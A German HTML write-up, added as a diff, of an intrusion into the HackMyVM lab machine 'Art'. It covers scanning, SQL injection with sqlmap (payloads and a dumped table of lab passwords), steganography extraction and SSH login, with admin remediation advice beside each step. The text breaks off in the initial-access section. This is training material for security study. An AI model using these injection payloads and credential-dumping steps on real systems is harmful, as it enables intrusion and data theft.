@@ -1,0 +1,828 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Art - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Art - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">wtfutil</div>
+                <div class="tool-item">nano / Editor</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (SQLi & Stego)</a></li>
+                <li><a href="#initial-access">Initial Access (lion)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (lion -> root)</a></li>
+                <li><a href="#poc">Proof of Concept (lion -> root via wtfutil)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Wie üblich beginnt der Test mit `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host wird unter `192.168.2.113` identifiziert. Die MAC-Adresse `08:00:27:73:d6:03` weist auf eine VirtualBox VM hin (PCS Systemtechnik GmbH).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel-IP gefunden. Als Nächstes einen detaillierten Port-Scan durchführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen anwenden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"> arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.153
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.2	00:50:56:f4:7d:5f	VMware, Inc.
+192.168.2.113	08:00:27:73:d6:03	PCS Systemtechnik GmbH
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.847 seconds (138.60 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf die Ziel-IP `192.168.2.113` ausgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Die Optionen (`-sS -sC -T5 -A -p-`) zielen auf einen schnellen, aber umfassenden Scan ab.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nmap findet zwei offene Ports:
+                *   **Port 22/tcp:** OpenSSH 8.4p1 (Debian 11). Ein aktueller SSH-Dienst.
+                *   **Port 80/tcp:** Nginx 1.18.0. Ein Webserver läuft. Nmap konnte keinen Seitentitel extrahieren (`Site doesn't have a title`).
+                Die OS-Erkennung deutet auf Linux hin und bestätigt die VirtualBox-Umgebung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Webserver auf Port 80 ist der primäre Angriffspunkt. Untersuchen Sie die Webseite genauer. Halten Sie SSH für spätere Versuche bereit.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie SSH und Nginx. Halten Sie das System und die Dienste aktuell. Entfernen Sie unnötige Dienste.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 00:23 CEST
+Nmap scan report for art (192.168.2.113)
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 45420f13cc8e49ddecf5bb0f58f4ef47 (RSA)
+|   256 122fa363c27399e3f86757ab2952aa06 (ECDSA)
+|_  256 f8797ab1a87ee99725c3404a0c2f5e69 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:73:D6:03 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms art (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu entdecken. Eine mittlere Wortliste und eine breite Palette von Dateiendungen werden getestet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster findet nur eine Datei: `/index.php`. Dies deutet darauf hin, dass die Webanwendung möglicherweise klein ist oder versteckte Inhalte andere Namen haben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `index.php` genauer. Versuchen Sie andere Wortlisten oder Tools zur Inhaltserkennung wie `feroxbuster`, das manchmal andere Ergebnisse liefert. Führen Sie einen Web-Schwachstellen-Scanner wie `nikto` aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse im Web-Root vorhanden sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.113 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.113
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,500
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (alle angegebenen) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.113/index.php            (Status: 200) [Size: 170]
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `feroxbuster` wird als Alternative oder Ergänzung zu `gobuster` verwendet, um nach Webinhalten zu suchen. Es verwendet eine andere Wortliste (`dirbuster/directory-list-2.3-medium.txt`) und testet spezifische Endungen. Der Hostname `art.hmv` wird verwendet (Annahme: wurde zur `/etc/hosts` hinzugefügt).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `feroxbuster` liefert deutlich mehr Ergebnisse als `gobuster`:
+                *   `/index.php` (bestätigt).
+                *   Mehrere `.jpg`-Dateien mit scheinbar zufälligen Namen (`zzxxccvv3.jpg`, `jlk19990.jpg`, `abc321.jpg`, `ertye.jpg`). Diese sind interessant, da Bilder Steganographie enthalten können.
+                *   Der Scan wurde manuell abgebrochen (`Caught ctrl+c`), daher ist die Liste möglicherweise unvollständig.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Laden Sie die gefundenen `.jpg`-Dateien herunter und untersuchen Sie sie auf Metadaten und Steganographie. Analysieren Sie den Quellcode von `index.php`, um zu sehen, wie diese Bilder verwendet werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie keine leicht erratbaren oder zufällig wirkenden Namen für wichtige Dateien. Überprüfen Sie, ob diese Bilder notwendig sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/media/sf_Kali_2022_Files]
+└─# <span class="command">feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://art.hmv -t 500</span></div>
+                     <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.7.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://art.hmv
+ 🚀  Threads               │ 500
+ 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.7.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET        4l       17w        170c http://art.hmv/index.php
+200      GET        4l       17w        170c http://art.hmv/
+200      GET    11659l    67120w  2732227c http://art.hmv/zzxxccvv3.jpg
+200      GET    13623l    72384w  2989800c http://art.hmv/jlk19990.jpg
+200      GET    14758l    82642w  3171502c http://art.hmv/abc321.jpg
+200      GET    20309l   114665w  4712929c http://art.hmv/ertye.jpg
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_art_hmv-1666826125.state ...
+[#############>------] - 2m   2433434/3528800 found:6 errors:5083 16629/s
+[##############>-----] - 2m   1242592/1764368 found:6 errors:5083 8397/s  http://art.hmv
+[##############>-----] - 2m   1240264/1764368 found:6 errors:5083 8386/s  http://art.hmv/
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `nikto` wird erneut ausgeführt, diesmal auf die IP-Adresse.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Nikto bestätigt den Nginx-Server und meldet die üblichen fehlenden Security Header. Es liefert keine neuen, kritischen Informationen im Vergleich zum vorherigen Nmap-Scan oder den Buster-Tools.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Analyse von `index.php` und den gefundenen Bilddateien.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security Header.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/media/sf_Kali_2022_Files]
+└─# <span class="command">nikto -h 192.168.2.113</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2022-10-27 00:35:45 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-10-27 00:35:57 (GMT2) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Quellcode von `http://192.168.2.113/index.php` wird untersucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Quellcode zeigt eine einfache HTML-Struktur, die die vier zuvor von `feroxbuster` gefundenen `.jpg`-Dateien mittels `<img>`-Tags einbindet. Wichtig ist der HTML-Kommentar am Ende: `<!-- Need to solve tag parameter problem. -->`. Dies ist ein klarer Hinweis darauf, dass es einen (wahrscheinlich GET-) Parameter namens `tag` gibt, der Probleme verursacht oder eine Schwachstelle darstellt.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den `tag`-Parameter. Fuzzing des Parameters mit Tools wie `wfuzz` oder `ffuf` auf mögliche Werte oder Schwachstellen (LFI, RFI, SQLi, Command Injection). Versuchen Sie, `index.php?tag=BEISPIEL` mit verschiedenen Werten aufzurufen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Entwickler sollten keine Hinweise auf Parameter oder interne Probleme in HTML-Kommentaren hinterlassen. Der Code, der den `tag`-Parameter verarbeitet, sollte auf Sicherheit überprüft werden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Quellcode von http://192.168.2.113/index.php
+
+SEE HMV GALLERY!
+<br>
+ <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
+<!-- Need to solve tag parameter problem. -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (SQLi & Stego)</h2>
+            <p class="analysis">
+                <strong>Analyse (Methode 1):</strong> Basierend auf dem Kommentar im Quellcode wird `wfuzz` verwendet, um den Parameter `tag` zu fuzzing. Es wird eine Liste gängiger Parameternamen verwendet (`url-params_from-top-55-most-popular-apps.txt`), was hier eigentlich nicht zielführend ist, da der Parametername `tag` bereits bekannt ist. Der Befehl testet `http://192.168.2.113/index.php?PARAM=PARAM`. `--hw 17` filtert Antworten heraus, die 17 Wörter enthalten (vermutlich die Standardantwort). `-c` aktiviert Farben, `-r 5` bedeutet 5 Wiederholungen pro Payload (unklarer Zweck hier).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Methode 1):</strong> Trotz der seltsamen Wortliste findet `wfuzz` heraus, dass der Parameter `tag` tatsächlich existiert und eine andere Antwort liefert (12 Wörter statt 17). Dies bestätigt die Existenz des Parameters und dass er die Ausgabe beeinflusst. Die Warnung bezüglich Pycurl und OpenSSL ist für diesen HTTP-Test irrelevant.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da der Parameter `tag` bestätigt ist, testen Sie ihn gezielt auf Schwachstellen wie SQL-Injection. Verwenden Sie manuelle Tests (z.B. `?tag='`, `?tag=1' OR '1'='1`) und automatisierte Tools wie `sqlmap`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Validieren und bereinigen Sie alle Benutzereingaben, insbesondere Parameter, die in Datenbankabfragen verwendet werden. Nutzen Sie Prepared Statements.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -r 5 --hw 17 http://192.168.2.113/index.php?FUZZ=FUZZ</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.113/index.php?FUZZ=FUZZ
+Total requests: 211
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000097:   200        4 L      12 W       70 Ch       "tag=tag"  # Bestätigt Parameter 'tag'
+
+Total time: 0.636838 seconds
+Processed Requests: 211
+Filtered Requests: 210
+Requests/sec.: 331.3319
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse (Methode 2):</strong> `sqlmap` wird verwendet, um gezielt nach SQL-Injection-Schwachstellen im Parameter `tag` zu suchen und diese auszunutzen.
+                *   `-u "http://192.168.2.113/index.php?tag="`: Ziel-URL mit dem anfälligen Parameter.
+                *   `--level=5 --risk=3`: Erhöht die Gründlichkeit und das Risiko der Tests (testet mehr SQLi-Typen und potenziell gefährlichere Payloads).
+                *   `--batch`: Führt `sqlmap` ohne interaktive Nachfragen aus (verwendet Standardantworten).
+                *   `-D gallery --dump`: Weist `sqlmap` an, alle Tabellen aus der Datenbank `gallery` zu dumpen (auszulesen).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Methode 2):</strong> `sqlmap` ist erfolgreich!
+                *   Es identifiziert den Parameter `tag` als anfällig für verschiedene SQLi-Typen (Boolean-based blind, Time-based blind, UNION query).
+                *   Es erkennt das Backend-DBMS als MySQL >= 5.0.12 (MariaDB fork).
+                *   Es findet eine Datenbank namens `gallery`.
+                *   Es dumpt zwei Tabellen:
+                    *   `art`: Enthält IDs, Tags (`beautiful`, `beauty`) und die Bildnamen der angezeigten `.jpg`-Dateien, sowie ein weiteres Bild: `dsa32.jpg`. Dieses Bild wurde von `feroxbuster` nicht gefunden und ist daher besonders interessant.
+                    *   `users`: Enthält Benutzerdaten! IDs, Benutzernamen (`mina`, `me`, `lula`, `notme`, `mona`, `admin`, `lila`, `root`) und Passwörter (`pass`). Die Passwörter scheinen Klartext oder einfach kodiert zu sein. Besonders relevant sind `mina:realpazz`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den gefundenen Zugangsdaten (`mina:realpazz`, `admin:EWQUDSAdaSDSA=`, `root:DSAewqDSAewq`) am SSH-Dienst anzumelden. Laden Sie das zusätzliche Bild `dsa32.jpg` herunter (`wget http://192.168.2.113/dsa32.jpg`) und untersuchen Sie es auf Steganographie, da es in der Datenbank aufgeführt, aber nicht auf der Webseite angezeigt wurde.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Beheben Sie die SQL-Injection-Lücke sofort durch Implementierung von Prepared Statements und Eingabevalidierung. Speichern Sie Passwörter niemals im Klartext in der Datenbank; verwenden Sie starke Hashing-Verfahren mit Salt (z.B. bcrypt, Argon2). Ändern Sie alle kompromittierten Passwörter. Überprüfen Sie den Webserver und die Datenbank auf weitere Kompromittierungen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://192.168.2.113/index.php?tag=" --level=5 --risk=3 --batch -D gallery --dump</span></div>
+                     <pre>
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:45:02 /2022-10-27/
+
+[00:45:02] [INFO] resuming back-end DBMS 'mysql'
+[00:45:02] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tag (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: tag=-5278' OR 6712=6712-- IkQt
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: tag=' AND (SELECT 1361 FROM (SELECT(SLEEP(5)))MUqE)-- nkpR
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: tag=' UNION ALL SELECT NULL,CONCAT(0x7170717071,0x4a4e4365786558655076564261544e6d7a55546c776d736967424369754f44656675755568516772,0x7162626a71),NULL-- -
+---
+[00:45:07] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[00:45:07] [INFO] fetching tables for database: 'gallery'
+[00:45:07] [INFO] fetching columns for table 'art' in database 'gallery'
+[00:45:07] [INFO] fetching entries for table 'art' in database 'gallery'
+Database: gallery
+Table: art
+[5 entries]
++----+-----------+---------------+
+| id | tag       | image         |
++----+-----------+---------------+
+| 1  | beautiful | abc321.jpg    |
+| 2  | beautiful | jlk19990.jpg  |
+| 3  | beautiful | ertye.jpg     |
+| 4  | beautiful | zzxxccvv3.jpg |
+| 5  | beauty    | dsa32.jpg     |
++----+-----------+---------------+
+
+[00:45:07] [INFO] table 'gallery.art' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.2.113/dump/gallery/art.csv'
+[00:45:07] [INFO] fetching columns for table 'users' in database 'gallery'
+[00:45:07] [INFO] fetching entries for table 'users' in database 'gallery'
+Database: gallery
+Table: users
+[8 entries]
++----+-----------------+--------+
+| id | pass            | user   |
++----+-----------------+--------+
+| 1  | <span class="password">realpazz</span>        | mina   |
+| 2  | mncxzKLLJDS     | me     |
+| 3  | 987dsKLDSOIU    | lula   |
+| 4  | BDSAOIUYEW      | notme  |
+| 5  | dsOIUSDAOydsa   | mona   |
+| 6  | <span class="password">EWQUDSAdaSDSA=</span>  | admin  |
+| 7  | VCXddsaEWQdsa_D | lila   |
+| 8  | <span class="password">DSAewqDSAewq</span>    | root   |
++----+-----------------+--------+
+
+[00:45:08] [INFO] table 'gallery.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.2.113/dump/gallery/users.csv'
+[00:45:08] [INFO] dumping entries for database 'gallery' completed
+[00:45:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.2.113'
+
+[*] ending @ 00:45:08 /2022-10-27/
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das von `sqlmap` entdeckte Bild `dsa32.jpg` (Annahme: wurde zuvor heruntergeladen) wird mit `steghide info` auf versteckte Daten untersucht. Anschließend wird `stegseek` verwendet, um ein mögliches Passwort für die versteckten Daten mit der `rockyou.txt`-Wortliste zu brute-forcen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `steghide info` bestätigt, dass in `dsa32.jpg` eine Datei namens `yes.txt` (17 Bytes) mittels `rijndael-128` (AES) verschlüsselt und komprimiert versteckt ist. Es wird ein Passwort benötigt.
+                *   `stegseek` findet das Passwort sehr schnell: Es ist ein **leeres Passwort** (`""`)! Stegseek extrahiert die versteckte Datei als `dsa32.jpg.out`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt der extrahierten Datei `dsa32.jpg.out` mit `cat`. Sie enthält wahrscheinlich weitere Zugangsdaten oder Hinweise.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Die Verwendung von Steganographie mit einem leeren Passwort bietet keinerlei Sicherheit. Wenn Steganographie verwendet wird, muss ein starkes Passwort gesetzt werden. Entfernen Sie die Datei `dsa32.jpg` vom Webserver, wenn sie nicht benötigt wird.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">steghide info dsa32.jpg</span></div>
+                     <pre>
+"dsa32.jpg":
+  Format: jpeg
+  Kapazität: 263,0 KB
+Soll versucht werden, Information über eingebettete Daten anzuzeigen ? (j/n) j
+Passwort eingeben:
+  Konnte keine eingebetteten Daten mit diesem Passwort extrahieren.
+                     </pre>
+                     <!-- Erneuter Versuch mit Enter (leeres Passwort) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">steghide info dsa32.jpg</span></div>
+                     <pre>
+"dsa32.jpg":
+  Format: jpeg
+  Kapazität: 263,0 KB
+Soll versucht werden, Information über eingebettete Daten anzuzeigen ? (j/n) j
+Passwort eingeben: <span class="password">(Enter)</span>
+  Eingebettete Datei "yes.txt":
+    Größe: 17,0 Byte
+    verschlüsselt: rijndael-128, cbc
+    komprimiert: ja
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">stegseek dsa32.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: ""
+[i] Original filename: "yes.txt".
+[i] Extracting to "dsa32.jpg.out".
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der von `stegseek` extrahierten Datei `dsa32.jpg.out` wird mit `cat` angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei enthält den String `<span class="password">lion/shel0vesyou</span>`. Dies sieht stark nach einem Benutzernamen (`lion`) und einem Passwort (`shel0vesyou`) aus, getrennt durch einen Schrägstrich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Zugangsdaten (`lion`:`shel0vesyou`) am SSH-Dienst anzumelden. Dies ist vielversprechender als die zuvor von `sqlmap` gefundenen Daten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie keine Zugangsdaten in versteckten Dateien, schon gar nicht mit schwachem oder keinem Passwortschutz. Ändern Sie das kompromittierte Passwort für `lion`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">cat dsa32.jpg.out</span></div>
+                     <pre><span class="password">lion/shel0vesyou</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (lion)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, sich mit den aus der Steganographie gewonnenen Zugangsdaten (`lion`:`shel0vesyou`) per SSH am Zielsystem (`art.hmv`) anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Nach Eingabe des Passworts `<span class="password">shel0vesyou</span>` erhält der Angreifer eine Shell als Benutzer `lion`. Der Willkommensbildschirm zeigt Debian Linux 5.10. Der Hostname ist `art`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Initialer Zugriff als `lion` erreicht! Beginnen Sie mit der lokalen Enumeration. Suchen Sie als Erstes nach der User-Flag, oft im Home-Verzeichnis. Überprüfen Sie dann die `sudo`-Rechte (`sudo -l`).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das Passwort `shel0vesyou` war erfolgreich. Es sollte sofort geändert werden. Die Sicherheitslücken (SQLi, Stego mit leerem Passwort) müssen geschlossen werden.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/art.hmv]
+└─# <span class="command">ssh lion@art.hmv</span></div>
+                    <pre>
+lion@art.hmv's password: <span class="password">shel0vesyou</span>
+Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Aug  3 11:18:18 2022 from 192.168.1.51
+                    </pre>
+                    <div class="prompt no-kali-prompt">lion@art:~$ </div>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Direkt nach dem Login wird das Home-Verzeichnis überprüft (`ls /home/`, `ls`) und versucht, die User-Flag (`user.txt`) zu lesen.
+             </p>
